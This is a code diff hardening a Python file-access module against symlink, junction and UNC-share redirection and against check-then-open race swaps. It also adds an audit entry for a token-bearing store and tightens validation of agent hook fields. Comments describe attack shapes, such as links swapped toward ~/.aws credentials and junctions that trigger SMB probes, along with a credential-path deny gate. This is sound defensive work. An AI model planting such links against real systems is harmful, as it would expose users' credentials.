+        # Only a DRIVE-absolute remainder is folded: ``\\?\UNC\...`` and every
+        # other extended namespace stay untouched and UNC-shaped so the gate
+        # below refuses them fail-closed. Mirrors the readlink-target ``\\?\``
+        # fold later in this function.
+        raw = _fold_extended_length_local(raw)
     if os.name == "nt" and is_unc_shape(raw) and not unc_probe_allowed(raw):
         return None
     expanded = os.path.expanduser(raw)
@@ -2090,103 +3007,10 @@ def validate_file_path(raw: str) -> str | None:
         # dashboard/handlers/themes.py::_resolve_local_source.
         if is_unc_shape(target) and not unc_probe_allowed(target):
             return None
-        # Bound the walk's cost BEFORE starting it: the screen is one lstat
-        # per component, so an adversarially deep path would stall the event
-        # loop inside the guard itself. Lexical separator count; deeper
-        # paths are refused, never probed.
-        if target.count("\\") + target.count("/") > _MAX_SCREENED_PATH_DEPTH:
+        screened = _screen_windows_links(target)
+        if screened is None:
             return None
-        # A linked ANCESTOR defeats the lexical UNC gates above: the path is
-        # not itself UNC-shaped -- only the link's target is -- and `realpath`
-        # below resolves the whole chain, so an ancestor symlink/junction
-        # whose target is a UNC share turns it into exactly the outbound SMB
-        # probe the gates exist to prevent. Windows-only on purpose: on POSIX
-        # resolving through a symlink is harmless and `is_sensitive_path` on
-        # the RESOLVED path below is the real guard (an unconditional walk
-        # would refuse legitimate setups like a symlinked /home). Reference:
-        # dashboard/handlers/themes.py::_resolve_local_source.
-        if platform_compat.first_linked_ancestor(target) is not None:
-            return None
-        # The LEAF is deliberately NOT blanket-refused at this site: the
-        # documented contract (pinned by tests) RESOLVES a benign leaf
-        # symlink and re-checks the resolved path. Instead the leaf's link
-        # CHAIN is walked hop by hop -- `readlink` is a local reparse-point
-        # metadata read, never a traversal -- and every hop's target is
-        # screened the same way the original path was (UNC shape, then
-        # linked-ancestor walk) BEFORE any lstat touches it, so a leaf link
-        # aimed at an untrusted UNC share, directly or through intermediate
-        # LOCAL links, is refused before the `realpath` that would probe it.
-        # Bounded like the OS's own ELOOP limit; fails closed on an
-        # unreadable link or an over-long chain.
-        hop = target
-        for _ in range(_LEAF_LINK_CHAIN_MAX):
-            if not platform_compat.is_link_or_junction(hop):
-                break
-            try:
-                # Guarded false-positive (same shape as the resolve() inside
-                # security.is_sensitive_path): this readlink IS the sanitizer
-                # -- it reads the link's own metadata to VET the user path
-                # and performs no read/write through it.
-                nxt = os.readlink(hop)  # lgtm[py/path-injection]
-            except OSError:
-                return None
-            # Fold the NT long-path spellings into the screened shapes:
-            # \\?\UNC\host\share is the long form of \\host\share, and a
-            # plain \\?\C:\... prefix is local. The OS honors the UNC
-            # component case-insensitively (\\?\unc\... resolves the same
-            # share), so the fold must too -- a case-sensitive match would
-            # let a lowercase spelling fall into the \\?\ branch below and
-            # launder the share into a relative-looking string.
-            if nxt[:8].upper() == "\\\\?\\UNC\\":
-                nxt = "\\\\" + nxt[8:]
-            elif nxt.startswith("\\\\?\\"):
-                # Only a drive-absolute remainder is a plain local spelling.
-                # Other extended namespaces (\\?\GLOBALROOT\Device\Mup\...,
-                # \\?\Volume{guid}\..., device paths) name kernel objects the
-                # walk cannot reason about, and stripping the prefix would
-                # launder them into relative-looking strings that realpath
-                # then follows -- refused fail-closed.
-                if not _DRIVE_ABS_RE.match(nxt[4:]):
-                    return None
-                nxt = nxt[4:]
-            # Shape screen FIRST: a UNC-shaped target is never relative, and
-            # anchoring must not run before the screen or it would rewrite
-            # the very shape being screened. Targets are held to a strict
-            # shape ALLOWLIST -- UNC (trusted roots only), drive-absolute,
-            # or plain relative -- because only those resolve against state
-            # this walk can also see.
-            if is_unc_shape(nxt):
-                if not unc_probe_allowed(nxt):
-                    return None
-            elif _DRIVE_ABS_RE.match(nxt):
-                pass  # fully qualified local target -- walked as-is below
-            elif nxt[:1] in "\\/" or _DRIVE_PREFIX_RE.match(nxt):
-                # Root-relative (\pivot resolves against the CURRENT drive's
-                # root) and drive-relative (D:pivot resolves against D:'s own
-                # per-drive CWD) targets depend on ambient state, so the
-                # string screened here and the string realpath resolves
-                # could diverge by drive -- the walk would inspect the wrong
-                # drive's ancestors. Legal but exotic link-target shapes no
-                # legitimate gateway path uses; refused fail-closed.
-                return None
-            else:
-                # A plain relative target resolves against the link's own
-                # directory (which carries the hop's drive); anchor it
-                # lexically the same way the OS would.
-                nxt = os.path.normpath(os.path.join(os.path.dirname(hop), nxt))
-            # Same depth bound as the entry screen: a link may point at an
-            # adversarially deep target, and the hop's own ancestor walk
-            # below costs one lstat per component.
-            if nxt.count("\\") + nxt.count("/") > _MAX_SCREENED_PATH_DEPTH:
-                return None
-            # The next hop's OWN ancestor chain is screened before the
-            # loop's lstat resolves it.
-            if platform_compat.first_linked_ancestor(nxt) is not None:
-                return None
-            hop = nxt
-        else:
-            # Chain longer than the bound: refuse rather than probe.
-            return None
+        target = screened
     # `realpath` consumes the SAME string the walk inspected -- resolving a
     # different form would traverse a chain the walk never saw.
     path = os.path.realpath(target)
@@ -2195,14 +3019,85 @@ def validate_file_path(raw: str) -> str | None:
     return path
 
 
+def _darwin_case_alias_matches(fd: int, path: str, opened_path: str) -> bool:
+    """Prove a case-only spelling difference without following a swapped link.
+
+    Case folding selects candidates, never authorizes them: case-sensitive
+    volumes can hold distinct inodes at those names. Walk the validated name
+    without resolving it again, then compare against the descriptor we READ.
+    """
+    if (
+        sys.platform != "darwin"
+        or path.casefold() != opened_path.casefold()
+        or not pinned_fs.supports_pinned_walk()
+    ):
+        return False
+    try:
+        witness = pinned_fs.open_in_pinned_parent(
+            os.path.dirname(path),
+            os.path.basename(path),
+            flags=os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_NONBLOCK", 0),
+            mode=0o600,
+            what="validated file",
+            refusal=OSError,
+        )
+        try:
+            return os.path.samestat(os.fstat(fd), os.fstat(witness))
+        finally:
+            os.close(witness)
+    except OSError:
+        return False
+
+
+def _opened_file_matches_validated_path(fd: int, path: str) -> bool:
+    """Check the opened regular file against its validated, symlink-free name."""
+    if not _stat.S_ISREG(os.fstat(fd).st_mode):
+        return False
+    opened_path = _fd_real_path(fd)
+    if opened_path is None:
+        return False
+    matches = os.path.normcase(os.path.normpath(opened_path)) == os.path.normcase(path)
+    if not matches:
+        matches = _darwin_case_alias_matches(fd, path, os.path.normpath(opened_path))
+    return matches and not is_sensitive_path(opened_path)
+
+
+def _opened_path_within_root(
+    opened_path: str, within_root: str, *, root_is_canonical: bool = False
+) -> bool:
+    """Compare kernel spellings on macOS without case-folding containment."""
+    root_real = within_root if root_is_canonical else os.path.realpath(within_root)
+    try:
+        if os.path.commonpath([opened_path, root_real]) == root_real:
+            return True
+    except ValueError:
+        return False
+    if sys.platform != "darwin" or not pinned_fs.supports_pinned_walk():
+        return False
+    # realpath can preserve an APFS alias. Pin that resolved root without
+    # following links, then compare kernel paths, never a folded prefix.
+    root_fd = pinned_fs.pin_parent(root_real, what="read root", refusal=OSError)
+    try:
+        root_witness = _fd_real_path(root_fd)
+        return (
+            root_witness is not None
+            and os.path.commonpath([opened_path, root_witness]) == root_witness
+        )
+    finally:
+        os.close(root_fd)
+
+
 def safe_read_file(path: str) -> str:
     """Read a file after enforcing ``is_sensitive_path``.
 
     Canonicalizes the path (following every symlink), re-checks the RESOLVED
     target against ``is_sensitive_path`` — so a symlink pointing into ``~/.aws``
-    etc. is refused through the link — then opens the canonical path with
-    ``O_NOFOLLOW`` as defense-in-depth against a TOCTOU swap of the final
-    component into a symlink after the check.  Opening the
+    etc. is refused through the link — then re-opens the canonical path through
+    :func:`kiro_crew.platform_compat.open_file_no_reparse` as defense-in-depth
+    against a TOCTOU swap of the final component into a link after the check.
+    That helper carries the refusal on Windows too, where ``O_NOFOLLOW`` does not
+    exist and a plain open would resolve a junction planted at the name.
+    Opening the
     already-resolved canonical path never rejects a legitimate file (its final
     component is not a symlink by construction), so this only closes the race.
 
@@ -2211,14 +3106,19 @@ def safe_read_file(path: str) -> str:
     unchanged so callers surface accurate messages.
     """
     resolved = os.path.realpath(os.path.expanduser(path))
-    if is_sensitive_path(resolved):
+    refusal = sensitive_path_refusal(resolved)
+    if refusal:
         # {resolved!r}, not {resolved}: the resolved target is caller/attacker
         # influenced (a symlink target is chosen by whoever wrote the link) and
         # this text reaches log records via ``exc_info`` — a raw newline in it
-        # would forge a second record.
-        raise PermissionError(f"Blocked: access to sensitive path: {resolved!r}")
+        # would forge a second record. The unverifiable wording is recognised by
+        # its fixed prefix, which no path spelling can produce, and already
+        # quotes the path; anything else is re-spelled here with the repr.
+        if not is_unverifiable_path_refusal(refusal):
+            refusal = f"Blocked: access to sensitive path: {resolved!r}"
+        raise PermissionError(refusal)
     try:
-        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(resolved, nonblocking=True)
     except OSError as exc:
         # ELOOP on the canonical (symlink-free) path means a concurrent TOCTOU
         # swap of the final component into a symlink — refuse it. Any other
@@ -2226,8 +3126,13 @@ def safe_read_file(path: str) -> str:
         if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
             raise PermissionError(f"Blocked: refusing to follow symlink at {resolved!r}") from exc
         raise
-    with os.fdopen(fd, "r", encoding="utf-8") as fh:
-        return fh.read()
+    try:
+        if not _opened_file_matches_validated_path(fd, resolved):
+            raise PermissionError(f"Blocked: opened file no longer matches safe path: {resolved!r}")
+        with os.fdopen(fd, "r", encoding="utf-8", closefd=False) as fh:
+            return fh.read()
+    finally:
+        os.close(fd)
 
 
 MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap
@@ -2242,9 +3147,16 @@ def safe_read_file_bytes(raw: str) -> bytes | None:
 
     ``validate_file_path`` already canonicalizes via ``realpath`` (following
     symlinks) and rejects sensitive resolved targets, so a workspace symlink
-    into ``~/.aws`` etc. is refused before any read.  The final open uses
-    ``O_NOFOLLOW`` on the canonical path as defense-in-depth against a TOCTOU
-    swap of the final component into a symlink after the check.
+    into ``~/.aws`` etc. is refused before any read.  The final open goes through
+    :func:`kiro_crew.platform_compat.open_file_no_reparse` as defense-in-depth
+    against a TOCTOU swap of the final component into a link after the check —
+    a refusal that holds on Windows as well, where ``O_NOFOLLOW`` does not exist.
+
+    Before reading, the opened descriptor must be a regular file whose kernel
+    path still matches the canonical name validated above and is not sensitive.
+    This also refuses an ancestor-directory swap. Comparison is lexical except
+    for a macOS case-only mismatch, which requires a no-follow walk back to the
+    held inode. Resolving the original name again could authorize a swap.
 
     Returns file content as bytes, or None if path is rejected or unreadable.
     """
@@ -2253,17 +3165,59 @@ def safe_read_file_bytes(raw: str) -> bytes | None:
         return None
 
     try:
-        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(path, nonblocking=True)
     except OSError:
         return None
     try:
-        with os.fdopen(fd, "rb") as fh:
+        if not _opened_file_matches_validated_path(fd, path):
+            return None
+        with os.fdopen(fd, "rb", closefd=False) as fh:
             data = fh.read(MAX_FILE_BYTES + 1)
         if len(data) > MAX_FILE_BYTES:
             raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
         return data
     except OSError:
         return None
+    finally:
+        os.close(fd)
+
+
+def safe_file_identity(raw: str) -> tuple[int, int, int, int] | None:
+    """``(st_dev, st_ino, st_mtime_ns, st_size)`` of a file, through the same gate as a read.
+
+    Every call screens the path afresh with :func:`validate_file_path` -- no
+    admission is remembered between calls, because a link swapped in after one
+    screen must not be followed by the next sample -- and takes the identity
+    from a descriptor opened by
+    :func:`kiro_crew.platform_compat.open_file_no_reparse`, never from a
+    name-based ``stat`` that would follow a junction to an attacker-chosen UNC
+    target. The descriptor must still be the regular file the screen
+    validated, exactly as :func:`safe_read_file_bytes` requires before it reads.
+
+    Returns ``None`` when the file does not exist. Raises ``PermissionError``
+    when the path is refused or the opened descriptor does not match it, and
+    ``OSError`` for any other failure to open.
+    """
+    path = validate_file_path(raw)
+    if path is None:
+        raise PermissionError("Blocked: file path was refused")
+    try:
+        # lstat never follows the final component, so absence is known before
+        # anything is opened -- the same probe order safe reads use.
+        os.lstat(path)
+    except FileNotFoundError:
+        return None
+    try:
+        fd = platform_compat.open_file_no_reparse(path, nonblocking=True)
+    except FileNotFoundError:
+        return None
+    try:
+        if not _opened_file_matches_validated_path(fd, path):
+            raise PermissionError("Blocked: opened file no longer matches safe path")
+        st = os.fstat(fd)
+        return (st.st_dev, st.st_ino, st.st_mtime_ns, st.st_size)
+    finally:
+        os.close(fd)
 
 
 def safe_read_file_bytes_with_identity(
@@ -2273,7 +3227,9 @@ def safe_read_file_bytes_with_identity(
 
     Like :func:`safe_read_file_bytes`, but closes the authorize-then-read TOCTOU
     window for callers that keep a filesystem allowlist. The file is opened ONCE
-    with ``O_NOFOLLOW`` and the ``fstat`` identity ``(st_dev, st_ino)`` of that
+    through :func:`kiro_crew.platform_compat.open_file_no_reparse`, which refuses a
+    link at the final component on every platform, and the ``fstat`` identity
+    ``(st_dev, st_ino)`` of that
     very descriptor MUST be in ``allowed_identities`` before any bytes are
     returned. Because authorization and read share one descriptor, a symlink- or
     directory-swap slipped in between ``realpath`` and ``open`` cannot substitute
@@ -2282,8 +3238,8 @@ def safe_read_file_bytes_with_identity(
     all filesystem reads stay funnelled through this centralized chokepoint.
 
     Returns bytes on success. Raises :class:`PermissionError` when the opened
-    inode is not allowlisted or a final-component symlink swap is detected
-    (``O_NOFOLLOW`` → ``ELOOP``), and :class:`FileTooLargeError` when the file
+    inode is not allowlisted or a final-component link swap is detected
+    (reported as ``ELOOP``), and :class:`FileTooLargeError` when the file
     exceeds ``MAX_FILE_BYTES``. Returns ``None`` when the path is rejected by
     :func:`validate_file_path` or is otherwise unreadable.
     """
@@ -2292,14 +3248,14 @@ def safe_read_file_bytes_with_identity(
         return None
 
     try:
-        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(path, nonblocking=True)
     except OSError as exc:
         if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
             raise PermissionError(f"Blocked: refusing to follow symlink at {path!r}") from exc
         return None
     try:
         st = os.fstat(fd)
-        if (st.st_dev, st.st_ino) not in allowed_identities:
+        if not _stat.S_ISREG(st.st_mode) or (st.st_dev, st.st_ino) not in allowed_identities:
             raise PermissionError("Blocked: file is not in the authorized set")
         with os.fdopen(fd, "rb", closefd=False) as fh:
             data = fh.read(MAX_FILE_BYTES + 1)
@@ -2338,6 +3294,7 @@ def safe_read_file_bytes_nolink(
     *,
     max_bytes: int | None = None,
     allow_truncate: bool = False,
+    within_root_is_canonical: bool = False,
 ) -> bytes | None:
     """Like :func:`safe_read_file_bytes` but also rejects hardlinked inodes.
 
@@ -2345,18 +3302,31 @@ def safe_read_file_bytes_nolink(
     A caller that lstat()s the path and then opens it by name leaves a race
     window where the file is swapped for a hardlink to a sensitive file
     (e.g. ``~/.aws/config``) between the check and the open. Here the open
-    happens first (``O_NOFOLLOW``), then ``fstat()`` on the descriptor —
+    happens first, refusing a link at the final component, then ``fstat()`` on
+    the descriptor —
     the inode that is validated is exactly the inode that is read:
     ``st_nlink > 1`` or a non-regular file type is rejected.
 
     When ``within_root`` is given, the OPENED descriptor's real path
     (via ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS, or
     ``GetFinalPathNameByHandleW`` on Windows) must resolve inside that root and
-    must not be sensitive. ``O_NOFOLLOW`` only guards the
+    must not be sensitive. Refusing the link only guards the
     FINAL path component — a nested directory swapped for a symlink between
     the tree walk and the open would silently escape the approved tree. The
     fd-path check is pinned to the inode actually opened, so no check-to-use
     window remains. If the fd's real path cannot be determined, fail closed.
+    ``within_root_is_canonical`` preserves a caller's already-resolved admission
+    root literally, so replacing that directory with a link cannot redefine it.
+
+    That final-component refusal comes from
+    :func:`kiro_crew.platform_compat.open_file_no_reparse`, not from an
+    ``O_NOFOLLOW`` flag, because the flag does not exist on Windows:
+    ``getattr(os, "O_NOFOLLOW", 0)`` is ``0`` there, so a plain ``os.open``
+    resolves a junction at the name and this chokepoint would hold one fewer
+    guarantee on one platform than the paragraph above claims. ``CreateFileW``
+    with ``FILE_FLAG_OPEN_REPARSE_POINT`` opens the reparse point AS ITSELF and
+    the helper reports ``ELOOP``, which is what POSIX reports for the same
+    shape, so the open is one operation with one contract everywhere.
 
     Returns file content as bytes, or None if the path is rejected,
     hardlinked, non-regular, escaping ``within_root``, or unreadable.
@@ -2373,23 +3343,22 @@ def safe_read_file_bytes_nolink(
         return None
 
     try:
-        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(path, nonblocking=True)
     except OSError:
         return None
     try:
         st = os.fstat(fd)
         if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
             return None
+        if not _opened_file_matches_validated_path(fd, path):
+            return None
         if within_root is not None:
             fd_real = _fd_real_path(fd)
             if fd_real is None:
                 return None  # cannot verify containment -> fail closed
-            root_real = os.path.realpath(within_root)
-            try:
-                contained = os.path.commonpath([fd_real, root_real]) == root_real
-            except ValueError:
-                contained = False
-            if not contained:
+            if not _opened_path_within_root(
+                fd_real, within_root, root_is_canonical=within_root_is_canonical
+            ):
                 return None  # opened inode escapes the approved tree
             if is_sensitive_path(fd_real):
                 return None
@@ -2498,12 +3467,7 @@ def _pinned_replace(
             fd_real = _fd_real_path(fd)
             if fd_real is None:
                 return None  # cannot verify containment -> fail closed
-            root_real = os.path.realpath(within_root)
-            try:
-                contained = os.path.commonpath([fd_real, root_real]) == root_real
-            except ValueError:
-                contained = False
-            if not contained:
+            if not _opened_path_within_root(fd_real, within_root):
                 return None  # opened inode escapes the approved tree
             if is_sensitive_path(fd_real):
                 return None
@@ -2610,11 +3574,11 @@ def _pinned_replace(
     # protects the user's data: the file is either the old bytes or all of the new
     # ones, never a shredded half-write.
     #
-    # This used to fail closed without the pinned variant. That made the whole
-    # mirror-back feature Linux-only in order to defend against someone renaming
-    # directories inside your project during the milliseconds of a save, on your
-    # own machine, to a file you explicitly asked us to link. Losing the feature
-    # on two platforms was the larger harm.
+    # Failing closed without the pinned variant would make the whole mirror-back
+    # feature Linux-only in order to defend against someone renaming directories
+    # inside your project during the milliseconds of a save, on your own machine,
+    # to a file you explicitly asked us to link. Losing the feature on two
+    # platforms is the larger harm.
     #
     # Use getattr for O_DIRECTORY: a bare os.O_DIRECTORY raises AttributeError,
     # which `except OSError` would NOT catch, surfacing as a 500.
@@ -2685,12 +3649,7 @@ def _pinned_replace(
             dir_real = _fd_real_path(dfd)
             if dir_real is None:
                 return "refused"  # cannot verify containment -> fail closed
-            root_real = os.path.realpath(within_root)
-            try:
-                contained = os.path.commonpath([dir_real, root_real]) == root_real
-            except ValueError:
-                contained = False
-            if not contained or is_sensitive_path(dir_real):
+            if not _opened_path_within_root(dir_real, within_root) or is_sensitive_path(dir_real):
                 return "refused"
         elif within_root is not None:
             # No directory handle to interrogate, so the parent is verified by
@@ -2926,22 +3885,30 @@ def safe_copy_file_nolink(raw: str, dest_dir: str) -> str | None:
     freshly created 0600 temp file inside *dest_dir*, so downstream readers
     never touch the caller-influenced original path again.
 
-    Validation mirrors :func:`safe_read_file_bytes_nolink`: open first
-    (``O_NOFOLLOW``), then ``fstat()`` on the descriptor (regular file,
+    Validation mirrors :func:`safe_read_file_bytes_nolink`: open first, refusing a
+    link at the final component, then ``fstat()`` on the descriptor (regular file,
     ``st_nlink == 1``), then the OPENED descriptor's real path (via
-    ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS) must not be
-    sensitive. ``O_NOFOLLOW`` only guards the FINAL path component — an
-    ancestor directory swapped for a symlink between validation and open
-    would otherwise reach a sensitive file. The fd-path check is pinned to
-    the inode actually opened and copied, so no check-to-use window remains.
-    If the fd's real path cannot be determined, fail closed.
+    ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS,
+    ``GetFinalPathNameByHandleW`` on Windows) must not be sensitive. Refusing the
+    link only guards the FINAL path component — an ancestor directory swapped for a
+    symlink between validation and open would otherwise reach a sensitive file. The
+    fd-path check is pinned to the inode actually opened and copied, so no
+    check-to-use window remains. If the fd's real path cannot be determined, fail
+    closed.
+
+    The open goes through :func:`kiro_crew.platform_compat.open_file_no_reparse`
+    because this function copies BYTES with a raw ``os.read``, and both halves of
+    that matter on Windows: ``O_NOFOLLOW`` does not exist there, so a plain
+    ``os.open`` follows a reparse point at the name AND hands back a CRT descriptor
+    in text mode, which truncates a binary payload at its first ``0x1A``. Media
+    files — what this function exists for — are exactly the payloads that carry one.
     """
     path = validate_file_path(raw)
     if path is None:
         return None
 
     try:
-        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(path, nonblocking=True)
     except OSError:
         return None
     tmp_fd = -1
@@ -2994,8 +3961,10 @@ def safe_read_prefix(raw: str, n: int) -> bytes | None:
     ``MAX_FILE_BYTES`` (e.g. the ~100 MB kiro-cli binary). ``validate_file_path``
     canonicalizes via ``realpath`` (following symlinks) and rejects sensitive
     resolved targets, so a symlink pointing into ``~/.aws`` etc. is refused
-    before any read. The open uses ``O_NOFOLLOW`` on the canonical path as
-    TOCTOU defense against a final-component symlink swap after the check.
+    before any read. The open goes through
+    :func:`kiro_crew.platform_compat.open_file_no_reparse` as TOCTOU defense
+    against a final-component link swap after the check — a refusal that holds on
+    Windows too, where ``O_NOFOLLOW`` does not exist.
 
     Returns up to *n* bytes, or None if the path is rejected or unreadable.
     """
@@ -3005,14 +3974,18 @@ def safe_read_prefix(raw: str, n: int) -> bytes | None:
     if path is None:
         return None
     try:
-        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(path, nonblocking=True)
     except OSError:
         return None
     try:
-        with os.fdopen(fd, "rb") as fh:
+        if not _opened_file_matches_validated_path(fd, path):
+            return None
+        with os.fdopen(fd, "rb", closefd=False) as fh:
             return fh.read(n)
     except OSError:
         return None
+    finally:
+        os.close(fd)
 
 
 # ---------------------------------------------------------------------------
@@ -3152,20 +4125,22 @@ def safe_read_file_internal(read_id: str) -> bytes | None:
             f"non-sensitive path; allowlist is only valid for sensitive paths",
         )
 
-    # Open with O_NOFOLLOW so a symlink at the final path component (e.g. a
-    # planted ~/.aws/sso/cache/kiro-auth-token-cli.json -> attacker file) is
-    # refused, binding the read to the real allowlisted file rather than a
-    # redirected target. Check + read share ONE descriptor (TOCTOU-safe), and
-    # fstat confirms a regular file before reading.
+    # Open so a link at the final path component (e.g. a planted
+    # ~/.aws/sso/cache/kiro-auth-token-cli.json -> attacker file) is refused,
+    # binding the read to the real allowlisted file rather than a redirected
+    # target. platform_compat.open_file_no_reparse carries that refusal on Windows
+    # as well, where O_NOFOLLOW does not exist and a plain os.open would resolve a
+    # junction planted at the name. Check + read share ONE descriptor
+    # (TOCTOU-safe), and fstat confirms a regular file before reading.
     import stat
 
     try:
-        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
+        fd = platform_compat.open_file_no_reparse(resolved, nonblocking=True)
     except FileNotFoundError:
         _emit_internal_read_audit(read_id, "missing")
         return None
     except OSError:
-        # ELOOP (final component is a symlink) and any other open error —
+        # ELOOP (final component is a link) and any other open error —
         # fail closed, never following the link.
         _emit_internal_read_audit(read_id, "unreadable")
         return None
@@ -3287,6 +4262,17 @@ _AUDIT_ONLY_READ_IDS: dict[str, str] = {
     # Audited on the observation a caller acts on rather than per poll -- the
     # reader holds a short cache -- for the same reason as the mint entry below.
     "kiro_prerequisite.identity_fingerprint": ".local/share/kiro-cli/data.sqlite3",
+    # Same store, read read-only by
+    # ``kiro_crew.apps.builtins.aws_control.backend.backup._export_cli_conversations``
+    # to copy ONLY the terminal conversation allowlist (its chat tables) into
+    # the off-host sessions archive. No token row is read and no credential value
+    # leaves the function -- the export writes a fresh database of the allowlisted
+    # tables alone -- but the file holds live bearer tokens whatever this reader
+    # touches, so opening it owes the same trail as every other reader here.
+    # Audited on every outcome (the store was opened) and fail-closed on success:
+    # a conversation export whose access cannot be recorded is dropped from the
+    # archive rather than shipped unaudited.
+    "aws_control.conversation_export": ".local/share/{kiro-cli,amazon-q}/data.sqlite3",
     # Class 2. kiro-cli's MCP OAuth artifact cache under ``~/.aws/sso/cache``.
     # ``kiro_crew.mcp_grant.grant_present`` STATS the paired
     # ``<sha256(mcp_url)>.token.json`` / ``.registration.json`` artifacts to learn
@@ -3435,15 +4421,19 @@ def validate_hook_fields(
 
     Raises ``ValueError`` (which the dashboard handler maps to HTTP 400) when:
 
-    * ``event`` is not one of ``HOOK_EVENTS``;
+    * ``event`` is not one of ``HOOK_EVENTS_ALL``;
     * ``timeout`` is not an int in ``[1, 300]``;
     * neither ``command`` nor ``skills`` is present (an empty hook);
     * ``skills`` is combined with a ``command`` (the skills would never fire);
     * ``skills`` is paired with an event other than UserPromptSubmit/AgentSpawn
       (the "Load skills:" directive has no consumer there);
+    * ``matcher`` is paired with one of ``HOOK_EVENTS_KAS_ONLY`` -- no event fires
+      those, so no payload exists for a matcher to filter and the field's subject
+      is undefined; storing one now would hand the round that defines the payload
+      a filter written against a different subject than the one it picks;
     * ``matcher_mode`` is ``regex`` with a syntactically invalid ``matcher``.
     """
-    if event not in HOOK_EVENTS:
+    if event not in HOOK_EVENTS_ALL:
         raise ValueError(f"invalid event: {event}")
     if (
         isinstance(timeout, bool)
@@ -3466,6 +4456,11 @@ def validate_hook_fields(
                 f"skills hooks cannot fire on {event} events — "
                 "choose UserPromptSubmit or AgentSpawn"
             )
+    if matcher and event in HOOK_EVENTS_KAS_ONLY:
+        raise ValueError(
+            f"a matcher cannot be set on {event} — no event fires it, so there is "
+            "no payload to filter; leave the matcher empty"
+        )
     if matcher_mode == "regex" and matcher:
         try:
             re.compile(matcher)
@@ -3483,7 +4478,7 @@ def validate_hook_fields(
 # which a hostile or careless command could echo straight back through stdout,
 # stderr, or the audit trail. This is the same strict-allowlist boundary the
 # authenticated ``gh``/``glab`` spawns cross (``_PROVIDER_BASE_ENV_KEYS`` in
-# ``dashboard/handlers/source_providers.py``); a variable a hook genuinely needs
+# ``dashboard/source_providers/runner.py``); a variable a hook genuinely needs
 # is added here by name, never by opening the gate to the whole environment. A
 # key absent from the host environment is simply not forwarded — the allowlist
 # is a filter, not a set of required keys — so a minimal container is unaffected.
@@ -3544,15 +4539,19 @@ def _hook_subprocess_env(hook: "ScriptHook", context: str) -> dict[str, str]:
     command (see ``_HOOK_BASE_ENV_KEYS``). The metadata variables are set LAST so
     a same-named ambient variable can never shadow them.
 
-    ``KIROCREW_HOOK_CONTEXT`` is capped for a Stop event only: the env var is
-    bounded by ARG_MAX (~32K on Windows), and a multi-KB Stop segment there can
-    fail subprocess creation. The full context still reaches the hook via the
-    stdin JSON payload (``Stop -> hook_event["assistant_text"]``) and drove
-    matcher evaluation, so the cap loses nothing the hook cannot recover.
+    ``KIROCREW_HOOK_CONTEXT`` is capped at 500 chars on every event: the env
+    var is bounded by ARG_MAX, and a large UserPromptSubmit prompt (pasted
+    docs) fails subprocess creation the same way a multi-KB Stop segment does.
+    For the events that echo their context onto stdin — UserPromptSubmit (the
+    ``prompt`` key) and Stop (``assistant_text``) — the full text still reaches
+    the hook there and drove matcher evaluation, so a hook reading stdin loses
+    nothing. Other events (e.g. AgentSpawn) carry no dedicated context key on
+    stdin, so for them this cap bounds what the env var conveys; their in-repo
+    callers pass a short context (a session key), well under the cap.
     """
     env = {k: v for k, v in os.environ.items() if k in _HOOK_BASE_ENV_KEYS}
     env["KIROCREW_HOOK_EVENT"] = hook.event
-    env["KIROCREW_HOOK_CONTEXT"] = context[:500] if hook.event == HOOK_EVENT_STOP else context
+    env["KIROCREW_HOOK_CONTEXT"] = context[:500]
     return env
 
 
@@ -3568,7 +4567,7 @@ class ScriptHook:
       PreToolUse BLOCKS the tool (fail closed; the block detail prefers
       ``ScriptHookResult.error``, then stderr, then "exited with code N").
       Every other event stays warn-only (stderr shown to user). There is no
-      per-hook advisory/fail-open opt-out yet (#7547).
+      per-hook advisory/fail-open opt-out.
     """
 
     id: str = ""
@@ -3619,10 +4618,27 @@ class ScriptHook:
         # written so an unknown event is visibly inert rather than silently
         # remapped, matching how `matcher_mode` junk falls through to glob.
         timeout = _normalize_hook_timeout(data.get("timeout", HOOK_TIMEOUT_DEFAULT))
+        event = data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT)
+        # Drop a matcher stored against an event no event fires, the same way the
+        # timeout above is clamped. ``validate_hook_fields`` refuses that pairing at
+        # the create/update boundary, and a hand-edited file can carry it anyway --
+        # so keeping it would load a hook that cannot be edited or even disabled
+        # without editing the file again, because update re-validates the MERGED
+        # fields and would meet the stored matcher. Normalizing here means the store
+        # never holds the combination and update never sees it. The matcher is the
+        # part with no meaning on these events; the hook itself is kept.
+        if matcher and event in HOOK_EVENTS_KAS_ONLY:
+            logger.warning(
+                "hook %s on %s carried a matcher; dropping it (no event fires this, "
+                "so there is no payload to filter)",
+                data.get("id", "?"),
+                event,
+            )
+            matcher = ""
         return cls(
             id=data.get("id", str(uuid.uuid4())[:8]),
             name=data.get("name", ""),
-            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
+            event=event,
             matcher=matcher,
             matcher_mode=data.get("matcher_mode", "glob"),
             command=data.get("command", ""),
@@ -3638,13 +4654,13 @@ class ScriptHook:
 
 # ── Script hook output caps ──
 #
-# ``run_script_hook`` used to ``await proc.communicate(...)``, which buffers
-# BOTH pipes in memory until EOF: a buggy or hostile hook could emit unbounded
